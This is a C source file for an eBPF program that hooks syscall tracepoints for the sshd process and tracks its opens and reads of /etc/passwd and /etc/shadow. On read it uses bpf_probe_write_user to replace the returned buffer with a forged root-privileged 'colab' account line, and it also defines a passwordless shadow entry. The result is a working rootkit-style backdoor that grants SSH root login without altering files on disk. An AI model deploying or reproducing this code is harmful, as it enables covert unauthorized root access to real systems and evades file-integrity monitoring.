// +build ignore

#include "common.h"
#include "my_def.h"
//#include "vmlinux.h"
char __license[] SEC("license") = "Dual MIT/GPL";

#define MISS 0
#define HIT 1
#define EMPTY 0
#define TARGET_NAME "sshd"
#define SHADOW "/etc/shadow"
#define PASSWD "/etc/passwd"
#define TASK_COMM_LEN			16
#define SKIP_OFFSET 0x2bb
#define IS_PASSWD 0xaaaa
#define IS_SHADOW 0xbbbb


#define IF_READ_KEY 0
#define PASSWD_FD_KEY 1
#define SHADOW_FD_KEY 2
#define SSHD_PID_KEY 3
#define READ_TO_KEY 4

#define COUNTER 5


#define HOOK_PASSWD 1

// int  shadow_fd = 0;
// int passwd_fd = 0;
// int if_read=0;
// int read_fd = EMPTY;
// int read_len = 0;

// void *read_to = NULL;
// int sshd_pid=0;
// char fmt[]="%s";
// char EVIL_SHADOW[] = "test::18997:0:99999:7:::";
// char EVIL_PASSWD[] = "shiyanlou:x:0:0:root:/root:/bin/bash";


/* For global int/long... */
struct bpf_map_def SEC("maps") raw_tracepoint_map = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u64),
    .max_entries = 10,
};

/* For global string */
struct bpf_map_def SEC("maps") raw_tracepoint_map_2 = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = 0x40,
    .max_entries = 10,
};

/* ****************************** Deceleration Begin ****************************** */
/* Another Helpers */
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx);



/* Exit Hook Operation */
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_exit_stat();
static __inline int handle_exit_fstat();
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx);


/* ****************************** Implement Over ****************************** */
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
  //char fmt[]="enter read\n";
  //bpf_trace_printk(fmt,sizeof(fmt));
  char fmt_passwd[]="read \"/etc/passwd\" ";
  char fmt_shadow[]="read \"/etc/shadow\" ";
  char fmt_read_to[]="read_to: 0x%lx\n";
  struct pt_regs *regs;
  char buf[0x40];
  char *pathname ;
  int len=0;
  int fd=0;
  regs = (struct pt_regs *)(ctx->args[0]);
  char * read_to=NULL;
  int key_read_to = READ_TO_KEY;
  bpf_probe_read(&fd , sizeof(fd) , &regs->di);
  /* Store read buffer addr */
  bpf_probe_read(&read_to , sizeof(read_to) , &regs->si);
  bpf_map_update_elem(&raw_tracepoint_map , &key_read_to , &read_to, BPF_ANY);
  
  bpf_probe_read(&len , sizeof(len) , &regs->dx);

  u64 if_read = 0;
  u64 *valp= NULL;
  int key_if_read = IF_READ_KEY;
  valp = bpf_map_lookup_elem(&raw_tracepoint_map, &key_if_read);
  if(!valp){
    return 0;
  }
  bpf_probe_read(&if_read,sizeof(if_read) , valp);
  
  if(if_read == EMPTY){
    return 0;
  }else if(if_read == IS_PASSWD){
    //bpf_printk("Read \"/etc/passwd\" \n");
    //bpf_trace_printk(fmt_passwd,sizeof(fmt_passwd));
    //bpf_trace_printk(fmt_read_to ,sizeof(fmt_read_to),read_to);
    //return 0;
  }else if(if_read == IS_SHADOW){

  }
  // if(shadow_fd == 0){
  //   bpf_trace_printk(fmt_shadow,sizeof(fmt_shadow));
  //   return 0;
  // }
  


  return 0;
}
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){
  char fmt[]="close fd: %d\n";
  
  struct pt_regs *regs;
  u64 fd=0;
  regs = (struct pt_regs *)(ctx->args[0]);
  bpf_probe_read(&fd , sizeof(fd) , &regs->di );
  //bpf_trace_printk(fmt,sizeof(fmt),fd);
  /* get shadow_fd */
  u64 *valp = NULL;
  int key_shadow_fd = SHADOW_FD_KEY;
  u64 shadow_fd = 0;
  valp = bpf_map_lookup_elem(&raw_tracepoint_map , &key_shadow_fd);
  if(!valp){
    return 0;
  }
  bpf_probe_read(&shadow_fd,sizeof(shadow_fd),valp);

  /* get passwd_fd */
  u64 *valp_2 = NULL;
  u64 passwd_fd = 0;
  int key_passwd_fd = PASSWD_FD_KEY;
  valp_2 = bpf_map_lookup_elem(&raw_tracepoint_map , &key_passwd_fd);
  if(!valp_2){
    return 0;
  }
  bpf_probe_read(&passwd_fd,sizeof(passwd_fd),valp_2);

  char fmt_close_shadow[]="/etc/shadow closed\n";
  char fmt_close_passwd[]="/etc/passwd closed\n";
  if(fd == shadow_fd){
    shadow_fd = EMPTY;
    bpf_map_update_elem(&raw_tracepoint_map , &key_shadow_fd, &shadow_fd, BPF_ANY);
    bpf_trace_printk(fmt_close_shadow,sizeof(fmt_close_shadow));
  }else if(fd == passwd_fd){
    passwd_fd = EMPTY;
    bpf_map_update_elem(&raw_tracepoint_map , &key_passwd_fd, &passwd_fd , BPF_ANY);
    bpf_trace_printk(fmt_close_passwd,sizeof(fmt_close_passwd));
  }
  return 0;
}
// static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx){
//     struct pt_regs *regs;
// 	char buf[0x40];
// 	char *pathname ;

// 	regs = (struct pt_regs *)(ctx->args[0]);

//   // Read the correspoding string which ends at NULL
//   //pathname = (char *)PT_REGS_PARM1_CORE(regs);
//   bpf_probe_read(&pathname , sizeof(pathname) , &regs->di);
//   bpf_probe_read_str(buf,sizeof(buf),pathname);
//   if(memcmp(buf , PASSWD , sizeof(PASSWD)) && memcmp(buf,SHADOW,sizeof(SHADOW))){
// 		return 0;
//   }
//   //bpf_printk("stat: %s\n",buf);

static __inline void bpf_elem_add(u64 *ptr,struct bpf_map_def *map ,int *key , u64 add){
    char fmt[]="add\n";
    u64 temp=0;
    bpf_probe_read(&temp,sizeof(u64),(u64 *)ptr);
    temp += add;
    bpf_map_update_elem(map,key,&temp,BPF_ANY);
    //bpf_trace_printk(fmt,sizeof(fmt));
    return ;

}

// int openat(int dirfd, const char *pathname, int flags);
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){

  
  char fmt_passwd[]="open /etc/passwd, fd: %d\n";
  char fmt_shadow[]="open /etc/shadow, fd: %llu\n";

  struct pt_regs *regs;
	char buf[0x40]={'\x00'};
	char *pathname ;

  u64 passwd_fd=0;
  u64 shadow_fd=0;
  int key_passwd = PASSWD_FD_KEY;
  int key_shadow = SHADOW_FD_KEY;
  int key_if_read = IF_READ_KEY;
  u64 if_read=0;
	regs = (struct pt_regs *)(ctx->args[0]);

  bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
  //pathname = (char *)PT_REGS_PARM2_CORE(regs);

  bpf_probe_read_str(buf,sizeof(buf),pathname);
  //bpf_printk("%s\n",buf);
  if(!memcmp(buf, PASSWD,sizeof(PASSWD))){
    /* Store passwd fd */
    bpf_probe_read(&passwd_fd , sizeof(passwd_fd) , &regs->di);
    bpf_map_update_elem(&raw_tracepoint_map,&key_passwd,&passwd_fd,BPF_ANY);
    /* Update if passwd read flag */
    if_read = IS_PASSWD;
    bpf_map_update_elem(&raw_tracepoint_map,&key_if_read,&if_read,BPF_ANY);
    bpf_trace_printk(fmt_passwd,sizeof(fmt_passwd),passwd_fd);
  }else if(!memcmp(buf , SHADOW,sizeof(SHADOW))){
    /* Store shadow fd */
    bpf_probe_read(&shadow_fd , sizeof(shadow_fd) , &regs->di);
    bpf_map_update_elem(&raw_tracepoint_map,&key_shadow,&shadow_fd,BPF_ANY);
    /*  Update if passwd read flag  */
    if_read = IS_SHADOW;
    bpf_map_update_elem(&raw_tracepoint_map,&key_if_read,&if_read,BPF_ANY);
    bpf_trace_printk(fmt_shadow,sizeof(fmt_shadow),shadow_fd);
  }
  
  return 0;
}

SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));

    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }

    /* Store SSHD PID */
    int key_sshd_pid = SSHD_PID_KEY;
    u64 sshd_pid = 0;
    sshd_pid = bpf_get_current_pid_tgid() & 0xffffffff;
    bpf_map_update_elem(&raw_tracepoint_map , &key_sshd_pid , &sshd_pid , BPF_ANY);
   
    switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            //handle_enter_stat(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            //bpf_printk("None of targets , break");
            return 0;
    }
    return 0;
}



static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx){
   char EVIL_SHADOW[] = "colab::19061:0:99999:7:::";
   char EVIL_PASSWD[] = "colab:x:0:0::/home/colab:/bin/sh";
  /* check read_to */
  char *read_to=NULL;
  void *valp_read_to = NULL;
  int key_read_to = READ_TO_KEY;
  valp_read_to = bpf_map_lookup_elem(&raw_tracepoint_map, &key_read_to);
  if(!valp_read_to){
    return 0;
  }
  bpf_probe_read(&read_to,sizeof(read_to),valp_read_to);
  if(read_to == NULL){
    return 0;
  }

  /* Check if_read */
  u64 if_read=0;
  int key_if_read = IF_READ_KEY;
  u64 *valp_if_read = NULL;
  valp_if_read = bpf_map_lookup_elem(&raw_tracepoint_map, &key_if_read);
  if(!valp_if_read){
    return 0;
  }
  bpf_probe_read(&if_read,sizeof(if_read) , valp_if_read);


  char fmt_if_read[]="if_read = 0x%lx\n";
  if(if_read != IS_PASSWD){
    
    return 0;
  }

  

  bpf_trace_printk(fmt_if_read,sizeof(fmt_if_read),read_to);
  



  s64 ret = ctx->args[1];
  if (ret <= 0)
    {
        read_to  = NULL;
        bpf_map_update_elem(&raw_tracepoint_map, &key_read_to , &read_to , BPF_ANY);
        //bpf_printk("[sys_exit::handle_exit_read] read failed!\n");
        return 0;
    }
  if (ret < sizeof(EVIL_PASSWD) || ret < sizeof(EVIL_SHADOW))
    {
        

        read_to = NULL;
        bpf_map_update_elem(&raw_tracepoint_map, &key_read_to , &read_to , BPF_ANY);
        return 0;
    }
  
  char fmt[]="hijack PASSWD!!!!!!\n";

 
  
  // Modify the "/etc/passwd"
  if (if_read == IS_PASSWD){

     //counter
    // int key_7 = COUNTER;
    // u64 init_val = 0;u64 now_val=0;
    // u64 *counter_valp = bpf_map_lookup_elem(&raw_tracepoint_map, &key_7);
    // if(!counter_valp){
    //       bpf_map_update_elem(&raw_tracepoint_map, &key_7, &init_val, BPF_ANY);
    //       //return 0;
    // }
    // bpf_elem_add(counter_valp , &raw_tracepoint_map , &key_7, 1);
    // bpf_probe_read(&now_val,sizeof(now_val),counter_valp);
    // char fmt_counter[]="counter: %d\n";
    // bpf_trace_printk(fmt_counter,sizeof(fmt_counter),now_val);
    // if( now_val<2 ){
    //   return 0;
    // }

    #ifdef HOOK_PASSWD
    bpf_trace_printk(fmt,sizeof(fmt));
    bpf_probe_write_user((char *)(read_to),EVIL_PASSWD, sizeof(EVIL_PASSWD));
    #endif
    //bpf_printk("%s\n",read_to);
  } // Modify the "/etc/shadow"
  else if(if_read == IS_SHADOW){
    #ifdef HOOK_SHADOW
    bpf_probe_write_user((char *)(read_to),EVIL_SHADOW, sizeof(EVIL_SHADOW));
    #endif 
    //bpf_printk("%s\n",read_to);
  }

  /*clean if_read */
  if_read = 0;
  bpf_map_update_elem(&raw_tracepoint_map,&key_if_read , &if_read , BPF_ANY);
  /* clean read_to */
  read_to = NULL;
  bpf_map_update_elem(&raw_tracepoint_map, &key_read_to , &read_to , BPF_ANY);
   return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  unsigned int id=0;
  struct pt_regs *regs;

  /* Lookup sshd_pid */
  u64 sshd_pid = 0;
  u64 *valp = NULL;
  int key_sshd_pid = SSHD_PID_KEY;
  valp = bpf_map_lookup_elem(&raw_tracepoint_map , &key_sshd_pid);
  if(!valp){
    return 0;
  }
  bpf_probe_read(&sshd_pid , sizeof(sshd_pid) , valp);

  if (sshd_pid == 0)
        return 0;
    int pid = bpf_get_current_pid_tgid() & 0xffffffff;
    if (pid != sshd_pid)
        return 0;
  

  regs = (struct pt_regs *)(ctx->args[0]);
  // Read syscall_id from orig_ax

  bpf_probe_read(&id,sizeof(id),&regs->orig_ax);
  //id = BPF_CORE_READ(regs,orig_ax);
  switch (id)
    {
        case 0:
            handle_exit_read(ctx);
            break;
        // case 4:
        //     handle_exit_stat();
        //     break;
        // case 5:
        //     handle_exit_fstat();
        //     break;
        // case 257:
        //     handle_exit_openat(ctx);
        //     break;
        default:
            return 0;
    }

  return 0;
}
